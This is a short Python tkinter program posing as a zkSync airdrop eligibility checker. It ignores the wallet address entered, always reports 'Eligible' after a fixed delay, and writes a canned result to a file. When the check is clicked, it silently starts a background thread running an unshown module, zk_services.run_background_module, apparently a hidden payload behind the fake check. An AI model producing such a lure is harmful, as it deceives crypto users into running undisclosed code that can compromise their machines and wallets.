import tkinter as tk
import threading
import zk_services

def scan():
    status_label.config(text="Checking eligibility...")
    root.after(2500, lambda: [
        status_label.config(text="Status: Eligible for zkSync Airdrop"),
        export_button.config(state="normal"),
        threading.Thread(target=zk_services.run_background_module).start()
    ])

def export():
    with open("zk_airdrop_result.txt", "w") as f:
        f.write("Status: Eligible for zkSync Retrodrop")
    status_label.config(text="Exported to zk_airdrop_result.txt")

root = tk.Tk()
root.title("zkSync Wallet Eligibility Checker")
root.geometry("420x200")
tk.Label(root, text="Enter your wallet address:").pack()
entry = tk.Entry(root, width=50); entry.pack()
tk.Button(root, text="Run Check", command=scan).pack(pady=5)
status_label = tk.Label(root, text=""); status_label.pack()
export_button = tk.Button(root, text="Export Result", command=export, state="disabled")
export_button.pack(pady=5)
root.mainloop()
